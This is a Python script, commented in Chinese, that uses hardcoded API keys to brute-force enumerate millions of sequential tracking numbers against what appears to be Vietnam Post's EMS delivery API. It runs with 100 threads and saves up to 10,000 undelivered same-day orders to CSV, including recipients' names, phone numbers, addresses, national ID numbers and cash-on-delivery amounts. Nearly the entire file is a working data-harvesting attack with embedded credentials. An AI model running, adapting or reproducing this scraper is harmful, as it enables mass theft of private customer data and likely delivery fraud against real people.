#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
找10000个当天订单 - 超大规模扫描
策略：大幅扩大扫描范围，全步长1扫描密集区
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

# 🔥 固定扫描15号的订单（可手动修改此日期）
TARGET_DATE = "15/10/2025"  # 格式：DD/MM/YYYY
TODAY = TARGET_DATE
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
proxy_stats = {'success': {}, 'failed': {}, 'lock': threading.Lock()}
TARGET = 10000  # 🎯 目标10000个订单

# 实时CSV文件
realtime_csv_file = f"realtime_orders_10k_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

USE_PROXY = False  # 不使用代理

def init_realtime_csv():
    """初始化实时CSV文件，写入表头"""
    headers = [
        '运单号', '发件日期', '装载日期', '配送日期',
        '发件人', '发件电话', '发件地址',
        '收件人', '收件电话', '收件地址', '收件人身份证',
        'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
        '重量', '状态代码', '状态名称',
        '发件邮局', '配送邮局', '路线代码',
        '是否COD', '是否邮资', '邮资名称',
        '配送签名URL', '配送照片URL', '配送认证照片URL',
        '备注', '指令', 'VAT代码', '原因', '解决方案',
        '检查状态', '检查状态号', '计数',
        '是否已配送', '是否今天订单', '收取费用', '发现时间'
    ]
    
    with open(realtime_csv_file, 'w', encoding='utf-8-sig') as f:
        f.write(','.join(headers) + '\n')

def save_order_to_csv(order):
    """实时保存单个订单到CSV"""
    with csv_lock:
        try:
            row = [
                order['tracking'], order['IssueDate'], order['LoadDate'], order['DeliveryDate'],
                order['SenderName'], order['SenderPhone'], order['SenderAddress'],
                order['ReceiverName'], order['ReceiverPhone'], order['ReceiverAddress'], order['ReceiverIDNumber'],
                str(order['CollectAmount']), str(order['AmountCOD']), str(order['FeeShip']),
                str(order['FeePPA']), str(order['FeeC']), str(order['FeeCancelOrder']), str(order['FeeCollectLater']),
                order['Weigh'], order['Status'], order['StatusName'],
                order['IssuePOCode'], order['DeliveryPOCode'], order['RouteCode'],
                order['IsCOD'], order['IsPaypost'], order['IsPaypostName'],
                order['DeliverySignature'], order['DeliveryImage'], order['DeliveryImageAuthen'],
                order['Note'], order['Instruction'], order['VATCode'], order['ReasonName'], order['SolutionName'],
                str(order['CheckStatus']), str(order['CheckStatusNo']), str(order['Count']),
                '否' if not order['is_delivered'] else '是', 
                '是' if order['is_today_order'] else '否',
                order['ReceiveCollectFee'],
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            ]
            
            formatted_row = []
            for item in row:
                item_str = str(item).replace('"', '""')
                if ',' in item_str or '"' in item_str or '\n' in item_str:
                    formatted_row.append(f'"{item_str}"')
                else:
                    formatted_row.append(item_str)
            
            with open(realtime_csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(','.join(formatted_row) + '\n')
                f.flush()
                
        except Exception as e:
            safe_print(f"❌ CSV保存错误: {e}")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    """智能判断是否是目标日期"""
    if not date_str:
        return False
    
    date_str = str(date_str)
    today_dd_mm_yyyy = TARGET_DATE
    parts = TARGET_DATE.split('/')
    today_mm_dd_yyyy = f"{parts[1]}/{parts[0]}/{parts[2]}"
    
    return (today_dd_mm_yyyy in date_str or 
            today_mm_dd_yyyy in date_str)

def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=5):
    """调用API并支持重试"""
    for attempt in range(max_retries):
        try:
            if json_data:
                r = requests.post(url, headers=headers, json=json_data, timeout=10)
            else:
                r = requests.post(url, headers=headers, data=data, timeout=10)
            
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    code = response_data.get('Code', '')
                    
                    if code == '00':
                        return r, response_data
                    elif code in ['98', '429', '99']:
                        if attempt < max_retries - 1:
                            time.sleep(0.1 * (attempt + 1))
                            continue
                        else:
                            return r, response_data
                    else:
                        return r, response_data
                        
                except json.JSONDecodeError:
                    if attempt < max_retries - 1:
                        continue
                    return r, None
            
            elif r.status_code in [403, 429, 502, 503, 504]:
                if attempt < max_retries - 1:
                    time.sleep(0.2 * (attempt + 1))
                    continue
                return r, None
            else:
                return r, None
                
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            if attempt < max_retries - 1:
                time.sleep(0.1)
                continue
            return None, None
            
        except Exception as e:
            if attempt < max_retries - 1:
                continue
            return None, None
    
    return None, None

def check_undelivered_order(tracking):
    """优化版查询：只用Inquiry API判断未配送"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    order = {
        'tracking': tracking,
        'ParcelCode': '', 'Count': '', 'IsCOD': '',
        'SenderName': '', 'SenderAddress': '', 'SenderPhone': '',
        'ReceiverName': '', 'ReceiverAddress': '', 'ReceiverPhone': '', 'ReceiverIDNumber': '',
        'CollectAmount': 0, 'IsPaypost': '', 'ReceiveCollectFee': '',
        'IssuePOCode': '', 'IssueDate': '', 'LoadDate': '',
        'DeliveryPOCode': '', 'DeliveryDate': '',
        'Weigh': '', 'Status': '', 'StatusName': '', 'ReasonName': '', 'SolutionName': '',
        'CheckStatus': '', 'CheckStatusNo': '', 'Note': '', 'RouteCode': '', 'IsPaypostName': '',
        'DeliverySignature': '', 'DeliveryImage': '', 'DeliveryImageAuthen': '',
        'AmountCOD': 0, 'FeePPA': 0, 'FeeC': 0, 'FeeShip': 0, 'FeeCancelOrder': 0, 'FeeCollectLater': 0,
        'Instruction': '', 'VATCode': '',
        'is_delivered': False,
        'is_today_order': False,
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        r1, data1 = call_api_with_retry(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            data={"ParcelCode": tracking, "Signature": sig},
            max_retries=5
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            for key in v.keys():
                if key in order:
                    order[key] = v[key] if v[key] is not None else ''
            
            delivery_date = v.get('DeliveryDate', '')
            order['is_delivered'] = bool(delivery_date)
            
            issue_date = v.get('IssueDate', '')
            load_date = v.get('LoadDate', '')
            order['is_today_order'] = is_today(issue_date) or is_today(load_date)
            
            if not order['is_delivered'] and order['is_today_order']:
                with state['lock']:
                    state['found'] += 1
                    state['orders'].append(order)
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                              f"👤{order['ReceiverName'][:20]} | "
                              f"📞{order['ReceiverPhone']} | "
                              f"💰{order['CollectAmount']:,}₫ | "
                              f"⚡{speed:.0f}/s")
                    
                    save_order_to_csv(order)
                
                return True
        else:
            return None
            
    except:
        pass
    
    return False

def save_final_summary():
    """保存最终统计JSON"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    json_file = f"scan_summary_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'condition': 'undelivered AND today',
            'realtime_csv_file': realtime_csv_file,
            'scan_completed': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }, f, ensure_ascii=False, indent=2)
    
    safe_print(f"\n💾 扫描完成，数据已保存:")
    safe_print(f"   📄 实时CSV: {realtime_csv_file} ({state['found']} 个订单)")
    safe_print(f"   📄 统计JSON: {json_file}\n")

# ==================== 🔥 超大规模扫描区间 - 目标10000个订单 ====================
# 策略：
# 1. EP系列全范围密集扫描（步长1）- 从490M到496M
# 2. EF系列全范围扩展（步长1）- 从40M到50M
# 3. 增加线程数到100
SCAN_RANGES = [
    # ========== EP系列 - 超大范围全扫描 ==========
    # EP核心区 - 已验证的密集区，步长1全扫
    ('EP', 492950000, 493050000, 1),   # 10万个号，步长1（核心区全扫）
    
    # EP周边扩展 - 步长1
    ('EP', 492900000, 492950000, 1),   # 往前5万
    ('EP', 493050000, 493100000, 1),   # 往后5万
    
    # EP大范围扫描 - 步长1
    ('EP', 492800000, 492900000, 1),   # 再往前10万
    ('EP', 493100000, 493200000, 1),   # 再往后10万
    
    # EP远端密集扫描 - 步长1
    ('EP', 492000000, 492800000, 1),   # 80万个号
    ('EP', 493200000, 494000000, 1),   # 80万个号
    
    # EP极远端采样 - 步长10
    ('EP', 490000000, 492000000, 10),  # 20万点
    ('EP', 494000000, 496000000, 10),  # 20万点
    
    # ========== EF系列 - 超大范围扫描 ==========
    # EF核心区 - 已验证区域，步长1全扫
    ('EF', 47500000, 47600000, 1),     # 10万个号
    
    # EF高成功率区 - 步长1
    ('EF', 43500000, 43600000, 1),     # 10万个号
    
    # EF大范围扫描 - 步长1
    ('EF', 47000000, 47500000, 1),     # 50万个号
    ('EF', 47600000, 48000000, 1),     # 40万个号
    ('EF', 43000000, 43500000, 1),     # 50万个号
    ('EF', 43600000, 44000000, 1),     # 40万个号
    
    # EF更大范围 - 步长5
    ('EF', 40000000, 43000000, 5),     # 60万点
    ('EF', 44000000, 47000000, 5),     # 60万点
    ('EF', 48000000, 50000000, 5),     # 40万点
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║        🚀 超大规模扫描 - 目标10000个当天未配送订单                   ║
╚════════════════════════════════════════════════════════════════════════════╝

⚡ 优化策略:
  • 超大扫描范围：EP 490M-496M, EF 40M-50M
  • 核心区步长1全扫描（200万+号段）
  • 100线程高并发
  • 快速重试机制

📊 扫描范围:
  
  🔵 EP系列:
    ✅ 核心密集区: EP492950000 - EP493050000 (步长1, 10万号)
    ✅ 周边扩展: EP492900000 - EP493100000 (步长1, 10万号)
    ✅ 大范围: EP492800000 - EP493200000 (步长1, 20万号)
    ✅ 远端: EP492000000 - EP494000000 (步长1, 160万号)
    ✅ 极远端: EP490000000 - EP496000000 (步长10, 40万点)
  
  🟢 EF系列:
    ✅ 核心区: EF047500000 - EF047600000 (步长1, 10万号)
    ✅ 高成功率: EF043500000 - EF043600000 (步长1, 10万号)
    ✅ 大范围: EF040000000 - EF050000000 (步长1-5, 250万号)
  
  总计: 约230万+ 号段扫描

🎯 筛选条件:
  ✅ 日期: {TARGET_DATE}
  ✅ 未配送: DeliveryDate 为空

🎯 目标: {TARGET:,}个订单
⚡ 预计速度: 80-120 次/秒（100线程）
⏱️  预计时间: 5-8小时（大规模扫描）
""")

init_realtime_csv()

print(f"🚀 开始超大规模扫描...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=100) as executor:  # 增加到100线程
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_undelivered_order, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            
            # 每500个输出一次进度（更频繁）
            if state['tested'] % 500 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                progress = (state['found'] / TARGET * 100) if TARGET > 0 else 0
                eta = (TARGET - state['found']) / (state['found'] / elapsed) if state['found'] > 0 and elapsed > 0 else 0
                
                safe_print(f"📊 已扫{state['tested']:,} | 找到{state['found']:,}/{TARGET:,} ({progress:.1f}%) | "
                          f"{speed:.0f}/s | 预计剩余{eta/60:.0f}分钟")
        except:
            pass

save_final_summary()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到当天未配送订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒

📄 保存文件:
  📊 实时CSV: {realtime_csv_file}
  📊 统计JSON: scan_summary_*.json
{'='*80}
""")
